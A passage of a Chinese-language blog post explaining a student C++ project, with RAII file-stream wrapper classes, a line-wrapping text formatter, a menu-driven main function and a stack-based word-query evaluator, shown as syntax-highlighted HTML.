Query <span class="keyword">operator</span>&amp; (<span class="type">const</span> Query &amp;lhs,<span class="type">const</span> Query &amp;rhs)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_ptr</span>&lt;QueryBase&gt;(<span class="keyword">new</span> <span class="built_in">AndQuery</span>(lhs,rhs));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sBBTg"><font style="color:rgb(0,0,0);">关于文件资源管理的类(RAII的思想体现）</font></h4><p>对于ofstream和ifstream，设计了对应的类管理对象，这样可以让其在不需要的时候调用析构函数。</p><p>在构造函数设计了一些东西，比如如果文件流已打开怎么处理，以及文件是否需要覆写。</p><p>以及获取当前管理文件流引用的方法，方便其他类方法的传参。</p><p>对于FileFormatter是为了实现需求4而设计，含有IFileStream和OfileStream的对象。</p><p>首先读取ifstream里的文章是以单词形式读取，这是为了方便格式化处理，让单词一个一个拼接。拼接好了达到要求就放到一个string，然后放到本类的vector<string> newbuf存储，之后再将句子写到ofstream流里即可。</p><p>如果下一个句子有句号开头的情况，就直接拼接到本次string后面</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">OFileStream</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    string FilePath;</span><br><span class="line">    ofstream ofile;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">OFileStream</span>(<span class="type">const</span> string &amp;name)&#123;</span><br><span class="line">        ofile.<span class="built_in">close</span>();</span><br><span class="line">        FilePath=name;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">FileExists</span>(name))&#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;文件存在，是否进行覆写？(Y/N):&quot;</span>;</span><br><span class="line">            <span class="type">char</span> response;</span><br><span class="line">            cin&gt;&gt;response;</span><br><span class="line">            cin.<span class="built_in">ignore</span>();</span><br><span class="line">            <span class="keyword">if</span>(response==<span class="string">&#x27;Y&#x27;</span>||response==<span class="string">&#x27;y&#x27;</span>)&#123;</span><br><span class="line">                ofile.<span class="built_in">close</span>();</span><br><span class="line">                ofile.<span class="built_in">open</span>(name,ios::out);</span><br><span class="line">                <span class="keyword">if</span>(ofile.<span class="built_in">is_open</span>())&#123;<span class="comment">//判断文件是否已经创建流</span></span><br><span class="line">                    cout&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;成功打开，请写入 :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;打开出现异常 :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;保留原有文件，不进行操作&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//文件不存在的情况</span></span><br><span class="line">            ofile.<span class="built_in">close</span>();</span><br><span class="line">            ofile.<span class="built_in">open</span>(name,ios::out);</span><br><span class="line">            <span class="keyword">if</span>(ofile.<span class="built_in">is_open</span>())&#123;<span class="comment">//判断文件是否已经创建流</span></span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;成功打开，请写入 :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="type">char</span> ch=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                <span class="keyword">throw</span> ch;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">OFileStream</span>()&#123;</span><br><span class="line">        FilePath=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(ofile.<span class="built_in">is_open</span>())&#123;</span><br><span class="line">            ofile.<span class="built_in">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">ofstream&amp; <span class="title">getofsteram</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ofile;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//文件读取操作流</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IFileStream</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    string FilePath;</span><br><span class="line">    ifstream ifile;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">IFileStream</span>(<span class="type">const</span> string &amp;name)&#123;</span><br><span class="line">        FilePath=name;</span><br><span class="line">        <span class="keyword">if</span>(ifile.<span class="built_in">is_open</span>())&#123;<span class="comment">//判断文件是否已经创建流</span></span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;已被打开过... :|&quot;</span>&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            ifile.<span class="built_in">open</span>(name);</span><br><span class="line">            <span class="keyword">if</span>(ifile.<span class="built_in">is_open</span>())&#123;<span class="comment">//判断文件是否已经创建流</span></span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;文件&quot;</span>&lt;&lt;name&lt;&lt;<span class="string">&quot;可以读取 :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                string something=<span class="string">&quot;文件&quot;</span>+name+<span class="string">&quot;读取出现异常,不存在的路径 :(&quot;</span>;</span><br><span class="line">                <span class="keyword">throw</span> something;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">IFileStream</span>()&#123;</span><br><span class="line">        FilePath=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(ifile.<span class="built_in">is_open</span>())&#123;</span><br><span class="line">            ifile.<span class="built_in">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">ifstream&amp; <span class="title">getifsteram</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ifile;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FileFormatter</span>&#123;</span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    OFileStream ost;</span><br><span class="line">    IFileStream ist;</span><br><span class="line">    vector&lt;string&gt; vecbuf;</span><br><span class="line">    vector&lt;string&gt; newbuf;</span><br><span class="line">    <span class="type">unsigned</span> num;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FileFormatter</span>(<span class="type">const</span> string FilePath,<span class="type">const</span> string newFilePath,<span class="type">unsigned</span> n):<span class="built_in">ist</span>(FilePath),<span class="built_in">ost</span>(newFilePath),<span class="built_in">num</span>(n),<span class="built_in">vecbuf</span>(),<span class="built_in">newbuf</span>()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">readFromFile</span><span class="params">()</span><span class="comment">//读取源文件</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//ist是读取文件的留，我们利用它把文件读取到指定的容器vector中。</span></span><br><span class="line">    <span class="comment">//然后再对其进行格式化。所以此函数的作用就是将ist的内容读取出来放到vector中。</span></span><br><span class="line">        <span class="comment">//如果文件不存在，初始化的时候会报错</span></span><br><span class="line">        <span class="comment">//该函数作用域结束后会调用析构函数，不会造成资源浪费。</span></span><br><span class="line">        stringstream ss;</span><br><span class="line">        string temp,t;</span><br><span class="line">        <span class="type">char</span> c[num+<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">getline</span>(ist.<span class="built_in">getifsteram</span>(),temp))&#123;</span><br><span class="line">           <span class="comment">//temp=c;</span></span><br><span class="line">           ss&lt;&lt;temp;</span><br><span class="line">           <span class="keyword">while</span>(ss &gt;&gt; t)&#123;</span><br><span class="line">                vecbuf.<span class="built_in">push_back</span>(t);<span class="comment">//把每个单词放在容器里。</span></span><br><span class="line">           &#125;</span><br><span class="line">           ss.<span class="built_in">clear</span>();<span class="comment">//提取完一行清除字符串流</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">formatText</span><span class="params">()</span><span class="comment">//格式化字符句子</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">//如果单词字符数大于n，则单独独占一行</span></span><br><span class="line">        <span class="comment">//外层循环的结束条件是vector是否用完</span></span><br><span class="line">        <span class="keyword">while</span>(vecbuf.<span class="built_in">size</span>())&#123;</span><br><span class="line">            string str=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(vecbuf.<span class="built_in">front</span>().<span class="built_in">length</span>()&gt;=num)&#123;</span><br><span class="line">                newbuf.<span class="built_in">push_back</span>(vecbuf.<span class="built_in">front</span>());</span><br><span class="line">                vecbuf.<span class="built_in">erase</span>(vecbuf.<span class="built_in">begin</span>());<span class="comment">//删除第一个元素</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">while</span>(str.<span class="built_in">length</span>()&lt;num)&#123;<span class="comment">//对于一个句子，当前句子长度+单词长度大于num就不执行了</span></span><br><span class="line">                <span class="type">bool</span> flag=vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;.&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;;&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;!&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;\&quot;&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;,&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;:&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;?&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>(str.<span class="built_in">length</span>()==<span class="number">0</span>)&#123; </span><br><span class="line">                        <span class="comment">//检测巨首是不是标点</span></span><br><span class="line">                        <span class="keyword">if</span>(flag)&#123;<span class="comment">//如果是标点符号，进行处理。</span></span><br><span class="line">                            cerr&lt;&lt;<span class="string">&quot;句首出现标点符号&quot;</span>&lt;&lt;endl;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span>(!vecbuf.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                            str=vecbuf.<span class="built_in">front</span>();</span><br><span class="line">                            vecbuf.<span class="built_in">erase</span>(vecbuf.<span class="built_in">begin</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;<span class="comment">//如果小于，就继续做</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>((str.<span class="built_in">length</span>()+vecbuf.<span class="built_in">front</span>().<span class="built_in">length</span>()+<span class="number">1</span>)&lt;=num&amp;&amp;!flag)&#123;<span class="comment">//句子加单词长度大于num，而不是加符号</span></span><br><span class="line">                        <span class="keyword">if</span>(!vecbuf.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                            str=str+<span class="string">&quot; &quot;</span>+vecbuf.<span class="built_in">front</span>();</span><br><span class="line">                            vecbuf.<span class="built_in">erase</span>(vecbuf.<span class="built_in">begin</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">                        <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">                            <span class="keyword">if</span>(!vecbuf.<span class="built_in">empty</span>())&#123;<span class="comment">//如果句尾是标点连着的话，就连续处理</span></span><br><span class="line">                                str=str+<span class="string">&quot; &quot;</span>+vecbuf.<span class="built_in">front</span>();</span><br><span class="line">                                vecbuf.<span class="built_in">erase</span>(vecbuf.<span class="built_in">begin</span>());</span><br><span class="line">                                flag=vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;.&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;;&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;!&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;\&quot;&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;,&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;:&quot;</span>||vecbuf.<span class="built_in">front</span>()==<span class="string">&quot;?&quot;</span>;</span><br><span class="line">                            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                flag=<span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        flag=<span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(vecbuf.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                newbuf.<span class="built_in">push_back</span>(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">saveToFile</span><span class="params">()</span><span class="comment">//将格式化后的文本内容保存到新的位置和文件名。</span></span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        ofstream&amp; outfile=ost.<span class="built_in">getofsteram</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">const</span> string &amp;s:newbuf)&#123;</span><br><span class="line">            outfile&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="WTL9t"><font style="color:rgb(0,0,0);">解析需求3,4,5</font></h3><p>:::info</p><ol start="3"><li><font style="color:rgb(0,0,0);">程序实现两个功能，一个是</font><strong><font style="color:rgb(0,0,0);">文件格式化</font></strong><font style="color:rgb(0,0,0);">功能，另一个是</font><strong><font style="color:rgb(0,0,0);">文本查询</font></strong><font style="color:rgb(0,0,0);">功能，打开程序时可以选择功能，类似如下 </font></li></ol><p><font style="color:rgb(0,0,0);">选择需要的功能： </font></p><p><font style="color:rgb(0,0,0);">1. </font><font style="color:rgb(0,0,0);">文件格式化 </font></p><p><font style="color:rgb(0,0,0);">2. </font><font style="color:rgb(0,0,0);">文本查询 </font></p><p><font style="color:rgb(0,0,0);">3. 退出 </font></p><p>:::</p><p>main函数就是针对需求3来设计，然后该读取的读取，该调用对的调用，以及可能涉及到的一些异常处理。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704529617060-c79e7bd4-da7a-4d43-bf1f-115b0b6a9eec.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//对输入的buf进行判别</span></span><br><span class="line">    <span class="type">int</span> cho;</span><br><span class="line">    string buf;</span><br><span class="line"></span><br><span class="line">    string newbuf;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">menu</span>();</span><br><span class="line">        cin&gt;&gt;cho;</span><br><span class="line">        cin.<span class="built_in">ignore</span>();</span><br><span class="line">        <span class="keyword">switch</span> (cho)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//让用户输入路径</span></span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;请输入读取的文件路径&quot;</span>&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt; &quot;</span>;</span><br><span class="line">                <span class="built_in">getline</span>(cin,buf);</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;请指定每行最大的字符数n :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt;&quot;</span>;</span><br><span class="line">                <span class="type">int</span> num;</span><br><span class="line">                cin&gt;&gt;num;</span><br><span class="line">                cin.<span class="built_in">ignore</span>();</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;请指定新文件保存的路径 :)&quot;</span>&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt;&quot;</span>;</span><br><span class="line">                <span class="built_in">getline</span>(cin,newbuf);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    ff=<span class="built_in">make_shared</span>&lt;FileFormatter&gt;(buf,newbuf,num);</span><br><span class="line">                    ff-&gt;<span class="built_in">readFromFile</span>();</span><br><span class="line">                    ff-&gt;formatText();</span><br><span class="line">                    ff-&gt;<span class="built_in">saveToFile</span>();</span><br><span class="line">                &#125;<span class="built_in">catch</span>(string str)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;错误的文件路径&quot;</span>&lt;&lt;buf&lt;&lt;<span class="string">&quot;导致打开异常 :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                &#125;<span class="built_in">catch</span>(<span class="type">char</span> ch)&#123;</span><br><span class="line">                    cerr&lt;&lt;<span class="string">&quot;错误的文件路径&quot;</span>&lt;&lt;buf&lt;&lt;<span class="string">&quot;导致写入异常 :(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;请输入读取的文件路径&quot;</span>&lt;&lt;endl;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt; &quot;</span>;</span><br><span class="line">                <span class="built_in">getline</span>(cin,newbuf);<span class="comment">//buf就是路径</span></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    ifs=<span class="built_in">make_shared</span>&lt;IFileStream&gt;(newbuf);</span><br><span class="line">                    cout&lt;&lt;<span class="string">&quot;&gt;&gt;&gt; &quot;</span>;</span><br><span class="line">                    <span class="built_in">getline</span>(cin,buf);<span class="comment">//从输入流中读取一行数据到buf</span></span><br><span class="line">                    <span class="built_in">BlankFliter</span>(buf);<span class="comment">//首先排除空格的影响</span></span><br><span class="line">                    <span class="built_in">StringTraslate</span>(buf);</span><br><span class="line">                &#125;<span class="built_in">catch</span>(string str)&#123;</span><br><span class="line">                    cerr&lt;&lt;str;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;无效的选项:(&quot;</span>&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>:::info<br><font style="color:rgb(0,0,0);">4. </font><font style="color:rgb(0,0,0);">进入文件格式化功能，程序会根据用户后续输入的文件位置（绝对地址或相对地址）和文 </font></p><p><font style="color:rgb(0,0,0);">件名读取文件，并由用户指定每行最大字符数</font><font style="color:rgb(0,0,0);"> n</font><font style="color:rgb(0,0,0);">，处理文件，使得文件在行数到达</font><font style="color:rgb(0,0,0);"> n </font><font style="color:rgb(0,0,0);">时进 </font></p><p><font style="color:rgb(0,0,0);">行换行（若为英文，需要切断单词时，提前换行，避免单词被切断，且需使得标点符号不 </font></p><p><font style="color:rgb(0,0,0);">在行首），并由用户指定保存新文件的位置与新文件名，若位置与新文件名已存在，由用 </font></p><p><font style="color:rgb(0,0,0);">户确认是否替换（原有文件内容不可改变，除非新文件与原文件在相同位置且有相同文件 </font></p><p><font style="color:rgb(0,0,0);">名，并被确认替换）。 </font></p><p>:::</p><p>调用在main的代码已经写了，对应FileFormatter类的设计已在需求2展示，这里直接展示结果</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704532241776-c17d27f3-7fed-4b78-92fd-53114aac86bc.png"></p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704532171956-431bee23-b70c-45a8-a252-a03f34a9141c.png"></p><p>:::info<br><font style="color:rgb(0,0,0);">5. </font><font style="color:rgb(0,0,0);">文本查询允许用户指定一个文件（给定文件位置与文件名），并在其中查询单词，查询结 </font></p><p><font style="color:rgb(0,0,0);">果是单词在文件中出现的次数及其所在行的列表。如果一个单词在一行中出现多次，此行 </font></p><p><font style="color:rgb(0,0,0);">只列出一次。行会按照升序输出，即第</font><font style="color:rgb(0,0,0);">7</font><font style="color:rgb(0,0,0);">行会在第</font><font style="color:rgb(0,0,0);">9</font><font style="color:rgb(0,0,0);">行之前显示，以此类推。如果查询不 </font></p><p><font style="color:rgb(0,0,0);">到，则不输出。例如，在读取一个文件后，在其中寻找单词</font><font style="color:rgb(0,0,0);">element</font><font style="color:rgb(0,0,0);">时，输出结果的前几行 </font></p><p><font style="color:rgb(0,0,0);">应该类似这样： </font></p><p><font style="color:rgb(0,0,0);">&gt;&gt;&gt; element </font></p><p><font style="color:rgb(163,21,21);">“element” </font><font style="color:rgb(0,0,0);">出现 112 次 </font></p><p><font style="color:rgb(0,0,0);"> (line 36) An element contains only a key; </font></p><p><font style="color:rgb(0,0,0);"> (line 158) operator creates a new element </font></p><p><font style="color:rgb(0,0,0);"> (line 160) Regardless of whether the element </font></p><p><font style="color:rgb(0,0,0);"> (line 168) When we fetch an element from a map, we </font></p><p><font style="color:rgb(0,0,0);"> (line 214) If the element is not found, find returns</font></p><p>:::</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1704523984530-c577a032-a2fd-4e93-b06d-5651ebcdb138.png"></p><p>结果如图，相对应的函数，定义了一个StringTraslate和ExpTraslate函数实现对应的效果，以及一些辅助函数如空格过滤，判断输入的字符串是变量还是常量等。</p><p>StringTraslate主要是按照操作符分割字符串，已经判断是查询操作还是赋值操作</p><p>ExpTraslate先是把StringTraslate处理后的字符串设法转换成后缀表达式，然后利用栈完成运算（利用栈也是为了支持复杂运算）。</p><p>对应的栈结构声明为stack&lt;shared_ptr<Query>&gt;，这样就不会因为生存周期的问题造成非法内存访问。</p><p>最后ExpTraslate调用 qstack.top()-&gt;eval(TextQuery(ifs-&gt;getifsteram())).print();相关的语句，就可以完成结果效果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 